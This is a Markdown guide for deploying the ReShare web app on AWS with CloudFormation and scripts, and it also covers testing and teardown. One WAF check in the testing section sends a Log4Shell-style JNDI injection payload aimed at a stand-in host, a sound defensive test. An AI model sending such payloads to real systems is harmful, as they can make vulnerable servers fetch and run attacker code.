# ReShare: AWS deployment guide

This guide takes you from an empty AWS account to ReShare running on AWS, and explains every service in the architecture diagram: what it does, where it is created, and how to check that it works.

> **Honest note:** the template and scripts were checked with a CloudFormation linter and tested locally, but they have not been run end-to-end on a real AWS account. If a step fails, see [Troubleshooting](#9-troubleshooting). Expect to fix one or two small things on the first deploy.

Everything is created by one CloudFormation stack (`infra/cloudformation.yaml`) and four scripts. You do **not** have to create each service by hand.

---

## 1. What you will end up with

```
                      AWS WAF (on the load balancer)        CloudTrail -> S3 (audit of AWS actions)
                                    |
Users --HTTPS--> CloudFront --+--> S3 frontend bucket (React build)
                              +--> S3 images bucket (/listings/*, uploaded with pre-signed URLs)
                              +--> /api/*  --> Application Load Balancer --> ECS Fargate (2-4 API tasks)
                                                                                  |-> RDS PostgreSQL
                                                                                  |-> SQS queue --> Lambda (delivery assignment) --> RDS
                                                                                  |-> SNS topic --> Lambda (notifier) --> SES email
                                                                                  |-> Rekognition (photo -> food name)
                                                                                  '-> Secrets Manager (DB password, JWT secret)
                                           CloudWatch: logs, metrics, alarms, dashboard
```

Not in your diagram but required: a VPC with a NAT gateway (so private servers can reach AWS services), SNS + SES (emails), Rekognition (photo recognition), a dead-letter queue (failed delivery messages). Amazon Cognito and ACM (custom certificate) are **not** used: sign-in is handled by the API itself, and the site uses CloudFront's built-in HTTPS address.

---

## 2. Before you start

### 2.1 Cost (read this first)
Roughly **US$3-4 per day** while it is running (NAT gateway, load balancer, 2 Fargate tasks, RDS) plus about US$0.30/day for WAF and the dashboard. **Delete the stack when you are done** ([section 10](#10-delete-everything-stop-paying)).

Set a budget alarm now: AWS Console > **Billing and Cost Management** > **Budgets** > **Create budget** > "Zero spend" or a monthly budget of US$20, with your email.

### 2.2 AWS account and a deploy user (never use the root user)
1. Create or open your AWS account and sign in. Pick the region **Asia Pacific (Mumbai) `ap-south-1`** in the top-right menu (the scripts default to it).
2. **IAM** > **Users** > **Create user** (for example `reshare-deployer`). Attach the policy **AdministratorAccess** (the stack creates IAM roles, so a narrower policy usually fails).
3. Open the user > **Security credentials** > **Create access key** > use case "Command Line Interface (CLI)". Copy the **Access key ID** and **Secret access key** somewhere safe.
4. Never paste these keys into chat, GitHub, or a file in this project. Delete the access key when you finish.

### 2.3 Tools on your computer (Windows)
| Tool | Check it | Install |
|---|---|---|
| AWS CLI v2 | `aws --version` | `winget install -e --id Amazon.AWSCLI` then reopen the terminal |
| Docker Desktop (running) | `docker info` | already installed |
| Node.js 20+ and npm | `node -v` | already installed |
| Git Bash (to run the `.sh` scripts) | `bash --version` | comes with Git for Windows |

Run every command below in **Git Bash**, from the project folder (`ReShare/`).

### 2.4 Sign in the CLI
```bash
aws configure
```
Enter the access key, the secret key, region `ap-south-1`, output format `json`. Then confirm it works and note your **12-digit account ID**:
```bash
aws sts get-caller-identity
```

---

## 3. Deploy (4 steps)

Set these once per terminal session (replace the values):
```bash
export AWS_REGION=ap-south-1
export AWS_ACCOUNT_ID=123456789012            # from aws sts get-caller-identity
export SES_FROM_ADDRESS=you@example.com       # an email you can open; used as the sender
# optional: export ALARM_EMAIL=alerts@example.com   (defaults to SES_FROM_ADDRESS)
```

### Step 1: build the API image and push it to ECR
```bash
bash infra/scripts/build-and-push.sh
```
Creates the ECR repository `reshare-api` if needed, builds `backend/`, and pushes it. Takes a few minutes.

### Step 2: create the whole stack
```bash
bash infra/scripts/deploy-stack.sh
```
This installs the Lambda dependencies, uploads the Lambda code, and runs CloudFormation. **It takes 15-25 minutes** (RDS and CloudFront are slow). When it finishes it prints a table of outputs (site URL, dashboard URL, bucket names).

While it runs you will get **two emails**:
- **SES** ("Amazon Web Services - Email Address Verification Request"): click the link. Without it, no notification emails are sent.
- **SNS** ("AWS Notification - Subscription Confirmation") for alarms: click **Confirm subscription**.

### Step 3: create the database tables
RDS is private (not reachable from your laptop), so the script runs the migration as a one-off task inside AWS:
```bash
SEED_DEMO=true bash infra/scripts/run-migrations.sh
```
`SEED_DEMO=true` also adds the demo accounts and listings (buyer, seller, admin, delivery). Their passwords are public in the README, so **remove `SEED_DEMO=true` for anything real**. The script ends with `Migration exit code: 0` on success.

### Step 4: publish the website
```bash
bash infra/scripts/deploy-frontend.sh
```
Builds the React app, uploads it to S3 and clears the CloudFront cache. It prints `Site: https://xxxx.cloudfront.net`. Open it and sign in with a demo account, for example `buyer@reshare.demo` / `BuyerDemo@2026!` (see the README for the others).

> New CloudFront distributions can take a few more minutes before the address works everywhere.

---

## 4. The services in the diagram: what, where, how to check

Console tip: always use region **ap-south-1** (top-right) except for CloudFront, IAM and the billing pages, which are global.

| Diagram item | What it does here | Created by (template resource) | How to check it |
|---|---|---|---|
| **Amazon CloudFront** | One HTTPS address for the site, the API and photos; caches static files | `Distribution` | CloudFront console > the distribution is **Deployed**. Open `SiteUrl`. |
| **S3 (Frontend bucket)** | Holds the React build; private, only CloudFront can read it | `FrontendBucket`, `FrontendBucketPolicy` | S3 > the bucket named in output `FrontendBucket` contains `index.html` and `assets/`. Opening the bucket URL directly must be denied. |
| **Application Load Balancer** | Spreads API traffic over the API tasks, runs health checks on `/api/health` | `LoadBalancer`, `TargetGroup`, `Listener` | EC2 > Target Groups > the group shows **2 healthy** targets. |
| **ECS Fargate (API Instances 1 and 2)** | Runs the Node.js API in 2 to 4 containers, scaling on CPU | `Cluster`, `TaskDefinition`, `Service`, `ScalableTarget` | ECS > Clusters > the service shows **2 running tasks**. |
| **Amazon RDS (PostgreSQL)** | Stores users, listings, orders, deliveries, audit log | `Database`, `DbSubnetGroup` | RDS > Databases > status **Available**, publicly accessible **No**. |
| **S3 (Images bucket)** | Stores seller photos, uploaded straight from the browser with pre-signed URLs | `ImagesBucket` | After a seller uploads a photo, it appears under `listings/<seller-id>/`. |
| **Amazon SQS (Order queue)** | Holds one "assign a delivery partner" message per new order (with a dead-letter queue for failures) | `DeliveryQueue`, `DeliveryDlq` | SQS > both queues exist; the main one is empty after processing. |
| **AWS Lambda (Delivery assignment)** | Picks an available delivery partner and updates the order | `AssignmentFunction`, `AssignmentTrigger` | Lambda > the function > Monitor > Logs. See the test in [section 5](#5-test-that-it-all-works). |
| **AWS WAF** | Blocks floods and known attack patterns before they reach the API | `WebAcl`, `WebAclAssociation` | WAF & Shield > Web ACLs (region ap-south-1) > `reshare-waf` > associated with the load balancer. |
| **Amazon CloudWatch** | Logs, metrics, 11 alarms and a dashboard | `ApiLogs`, `Dashboard`, the `*Alarm` resources | CloudWatch > Dashboards > `reshare-overview`; Alarms list shows the alarms (most say "OK" or "Insufficient data" at first). |
| **AWS Secrets Manager** | Stores the database password and the login-token signing key; ECS reads them at start | `DbSecret`, `JwtSecret` | Secrets Manager > two secrets. Nothing is stored in code or environment files. |
| **AWS CloudTrail** | Records who changed what in your AWS account | `Trail`, `TrailBucket` | CloudTrail > Trails > `reshare-trail` (logging on). Log files appear in its bucket after about 15 minutes. |

Also created, not in the diagram: **SNS** `OrderEventsTopic` and **SES** `SesIdentity` plus the notifier Lambda (emails), **Rekognition** (permission on the API task role, no resource to create), a **VPC** with public and private subnets and one **NAT gateway**, security groups, and IAM roles.

---

## 5. Test that it all works

Replace `SITE` with your `https://xxxx.cloudfront.net` address.

1. **API and load balancer**
   ```bash
   curl SITE/api/health          # {"status":"ok"}
   ```
2. **Load balancing across tasks** (the "load-balancing demo"): run this several times and watch the `instance` value change between the two tasks:
   ```bash
   curl SITE/api/diagnostics/instance
   ```
3. **Browse and buy**: sign in as the buyer, reserve an item (demo checkout, no money moves).
4. **Delivery assignment (SQS + Lambda)**: the seeded delivery partner has service area `Pune`, and automatic assignment only matches a listing whose **pickup area is exactly `Pune`** (case-insensitive). So, signed in as the seller, create a listing with pickup area `Pune`, then order it as the buyer. Within a few seconds the order moves to **Assigned**. Check the Lambda logs in CloudWatch. For the seeded listings (areas like Viman Nagar), no partner matches, so the order stays pending and the **admin assigns it by hand** from the admin dashboard.
5. **Email (SNS + SES)**: sign in as the delivery partner, accept, mark picked up, mark delivered. The buyer is emailed at each stage. In the SES **sandbox** you can only send to **verified** addresses: SES console > **Identities** > **Create identity** > verify the buyer's email too (or request production access).
6. **Photo recognition (Rekognition)**: as the seller, **List food** > add a photo of a banana or bread. The name and category fill in.
7. **Barcode**: **List food** > type `3017620422003` > **Look up**.
8. **WAF**: a request that looks like a known attack should be blocked:
   ```bash
   curl -i -H 'User-Agent: ${jndi:ldap://example.com/a}' SITE/api/health
   ```
   Expect `403 Forbidden`. Then WAF console > your web ACL > **Sampled requests** shows it.
9. **CloudTrail**: CloudTrail > **Event history** shows your recent actions (for example `CreateStack`).
10. **Alarms**: CloudWatch > Alarms. New alarms start as "Insufficient data" and turn "OK" after a few minutes. To see one fire, SQS console > the **dead-letter queue** (`DeliveryDlq`) > **Send and receive messages** > send any message. The "delivery messages are failing" alarm should go red within about 5 minutes and email you.

---

## 6. Updating after you change code

**Backend:**
```bash
bash infra/scripts/build-and-push.sh
CLUSTER=$(aws cloudformation describe-stacks --stack-name reshare --query "Stacks[0].Outputs[?OutputKey=='ClusterName'].OutputValue" --output text)
SERVICE=$(aws ecs list-services --cluster "$CLUSTER" --query 'serviceArns[0]' --output text)
aws ecs update-service --cluster "$CLUSTER" --service "$SERVICE" --force-new-deployment
```
**Database changes** (new files in `backend/db/migrations/`): `bash infra/scripts/run-migrations.sh` after the new image is deployed.
**Frontend:** `bash infra/scripts/deploy-frontend.sh`.
**Infrastructure or Lambda code:** `bash infra/scripts/deploy-stack.sh`.

---

## 7. Settings you may want to change

| What | Where |
|---|---|
| Number of API tasks | Add `DesiredCount=3 MaxCount=6` to the `--parameter-overrides` line in `infra/scripts/deploy-stack.sh`, then rerun it |
| Database size | Add `DbInstanceClass=db.t4g.small` to the same `--parameter-overrides` line (default `db.t4g.micro`) |
| Alarm email | `ALARM_EMAIL` environment variable |
| Region | `AWS_REGION` (check that SES and Rekognition are available there) |

---

## 8. Production checklist (before real users)

- Do **not** seed the demo accounts (run migrations **without** `SEED_DEMO=true`) and remove them if already created.
- Payments are demo only. Add a real payment provider and signed webhooks before accepting money.
- Request SES **production access** so emails reach any address.
- Use your own domain and an ACM certificate on CloudFront; restrict the load balancer to CloudFront only.
- Turn on RDS Multi-AZ and a longer backup retention.
- Delete the deploy user's access key when you are done deploying.

---

## 9. Troubleshooting

| Problem | What to do |
|---|---|
| `aws: command not found` | Reopen the terminal after installing the AWS CLI. |
| `docker: failed to connect` | Start Docker Desktop and wait until it says it is running. |
| A script says `Set AWS_ACCOUNT_ID` (or similar) | You skipped the `export` lines in section 3. |
| Stack ends in `ROLLBACK_COMPLETE` | See the first failure: `aws cloudformation describe-stack-events --stack-name reshare --query "StackEvents[?ResourceStatus=='CREATE_FAILED'].[LogicalResourceId,ResourceStatusReason]" --output table`. Delete the failed stack (`aws cloudformation delete-stack --stack-name reshare`) before retrying. |
| `AccessDenied` creating roles/resources | The deploy user needs **AdministratorAccess**. |
| ECS tasks keep restarting or the target group is **unhealthy** | CloudWatch > Log groups > `/ecs/reshare-api`. Common causes: image not pushed (rerun step 1), or the task cannot reach the secrets/ECR (the NAT gateway must exist). |
| Migration exit code is not 0 | Read the output in log group `/ecs/reshare-api`; the task name is printed by the script. |
| Site shows `AccessDenied` or a blank page | Run step 4 again (`deploy-frontend.sh`); wait a few minutes for CloudFront. |
| Sign-in works but pages show "Request failed" | Run step 3 (the tables do not exist yet). |
| No emails arrive | You did not click the SES verification link, or the recipient is not verified (SES sandbox). Check the notifier Lambda logs for `MessageRejected`. |
| Orders stay "Pending assignment" | Expected unless the listing's pickup area is exactly `Pune` (see test 4). Admins can assign by hand. |
| Photo recognition says "not available" | Check the API logs (`/ecs/reshare-api`) for the Rekognition error, and that your region supports Rekognition. |
| A legitimate request gets `403` | WAF blocked it. WAF console > Sampled requests > find the rule > set that rule to **Count**. |
| "Too many requests" while testing | The app rate-limits sign-ins, sign-ups, orders and barcode/photo lookups. Wait 15 minutes, or force a new ECS deployment to reset the in-memory counters. |

---

## 10. Delete everything (stop paying)

1. Empty the three buckets (CloudFormation cannot delete a bucket that has files). Get the names from the stack outputs and resources:
   ```bash
   aws s3 rm s3://<FrontendBucket> --recursive
   aws s3 rm s3://<ImagesBucket> --recursive
   aws s3 rm s3://<TrailBucket> --recursive
   ```
   (S3 console > Buckets, or `aws cloudformation list-stack-resources --stack-name reshare` shows the generated names.)
2. Delete the stack and wait for it to finish (10-20 minutes):
   ```bash
   aws cloudformation delete-stack --stack-name reshare
   aws cloudformation wait stack-delete-complete --stack-name reshare
   ```
3. Remove the things the stack does not own:
   ```bash
   aws ecr delete-repository --repository-name reshare-api --force
   aws s3 rb s3://reshare-artifacts-$AWS_ACCOUNT_ID-$AWS_REGION --force
   ```
4. RDS keeps a **final snapshot** (RDS > Snapshots). Delete it if you do not need it. Secrets Manager keeps the two secrets for a recovery period before they disappear.
5. Delete the deploy user's access key in IAM.
6. Check **Billing > Cost Explorer** the next day to confirm nothing is still running.
